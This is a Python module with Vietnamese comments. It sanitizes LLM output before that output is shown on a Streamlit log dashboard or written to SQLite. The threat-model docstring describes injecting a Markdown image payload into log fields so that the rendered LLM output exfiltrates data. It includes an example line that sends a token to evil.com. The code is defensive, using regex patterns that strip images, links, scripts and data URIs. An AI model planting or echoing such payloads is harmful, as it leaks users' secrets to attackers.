"""
Output Sanitizer: Data Exfiltration Defense (Attack Vector #04)

THREAT MODEL:
  Kẻ tấn công chèn payload dạng Markdown/HTML vào log fields (User-Agent, URI).
  Khi LLM reproduce nội dung này trong output, Dashboard render markdown →
  trình duyệt tự động gửi HTTP request đến server kẻ tấn công:

  Ví dụ payload trong log:
    User-Agent: ![x](https://evil.com/steal?token=SECRET_DATA)

  Nếu output không được sanitize, Streamlit sẽ render <img> tag → browser
  gửi GET request kèm data đến evil.com → Data Exfiltration thành công.

GIẢI PHÁP:
  Quét OUTPUT của LLM (không phải input) trước khi:
  1. Hiển thị trên Dashboard (Streamlit)
  2. Ghi vào Audit Trail DB (SQLite)
  
  Strip/neutralize tất cả:
  - Markdown images: ![alt](url)
  - Markdown links: [text](url)  
  - HTML tags: <img>, <a>, <iframe>, <script>, <object>, <embed>
  - Data URIs: data:text/html;base64,...
  - Raw URLs có query params nghi ngờ exfil
"""

import re
import logging

logger = logging.getLogger(__name__)


class OutputSanitizer:
    """
    Sanitize LLM output TRƯỚC khi render trên UI hoặc ghi DB.
    Chống Data Exfiltration via Markdown/HTML rendering.
    """

    # Patterns nguy hiểm trong output
    DANGEROUS_PATTERNS = [
        # Markdown image (exfil vector chính)
        (r'!\[[^\]]*\]\([^\)]+\)', '[IMG_STRIPPED]'),
        # Markdown links to external domains
        (r'\[[^\]]*\]\(https?://[^\)]+\)', '[LINK_STRIPPED]'),
        # HTML img tags
        (r'<img[^>]*>', '[IMG_STRIPPED]'),
        # HTML anchor tags
        (r'<a\s[^>]*>.*?</a>', '[LINK_STRIPPED]'),
        # HTML iframe (embedded content)
        (r'<iframe[^>]*>.*?</iframe>', '[IFRAME_STRIPPED]'),
        # HTML script tags
        (r'<script[^>]*>.*?</script>', '[SCRIPT_STRIPPED]'),
        # HTML object/embed (plugin-based exfil)
        (r'<object[^>]*>.*?</object>', '[OBJECT_STRIPPED]'),
        (r'<embed[^>]*/?>', '[EMBED_STRIPPED]'),
        # Data URIs (can encode arbitrary HTML/JS)
        (r'data:[a-zA-Z]+/[a-zA-Z+]+;base64,[A-Za-z0-9+/=]+', '[DATA_URI_STRIPPED]'),
        # SVG with potential JS execution
        (r'<svg[^>]*>.*?</svg>', '[SVG_STRIPPED]'),
        # Style tags (CSS-based exfil via url())
        (r'<style[^>]*>.*?</style>', '[STYLE_STRIPPED]'),
    ]

    def __init__(self):
        self.compiled_patterns = [
            (re.compile(pattern, re.IGNORECASE | re.DOTALL), replacement)
            for pattern, replacement in self.DANGEROUS_PATTERNS
        ]
        self._strip_count = 0

    def sanitize(self, text: str) -> str:
        """
        Sanitize output text. Strip dangerous markdown/HTML patterns.
        Returns clean text safe for rendering.
        """
        if not text:
            return text

        clean = text
        self._strip_count = 0

        for compiled_re, replacement in self.compiled_patterns:
            matches = compiled_re.findall(clean)
            if matches:
                self._strip_count += len(matches)
                clean = compiled_re.sub(replacement, clean)

        if self._strip_count > 0:
            logger.warning(
                f"[OUTPUT SANITIZER] Stripped {self._strip_count} dangerous "
                f"patterns from LLM output (potential Data Exfiltration attempt)"
            )

        return clean

    def sanitize_for_db(self, text: str) -> str:
        """
        Sanitize text trước khi ghi vào SQLite.
        Ngoài strip markdown/HTML, còn chặn SQL injection cơ bản.
        """
        clean = self.sanitize(text)
        # Neutralize SQL injection trong text fields
        # (SQLite dùng parameterized queries nên đây là defense-in-depth)
        clean = clean.replace("'", "''")
        return clean

    @property
    def last_strip_count(self) -> int:
        """Số patterns đã bị strip trong lần sanitize gần nhất."""
        return self._strip_count


# Singleton
output_sanitizer = OutputSanitizer()
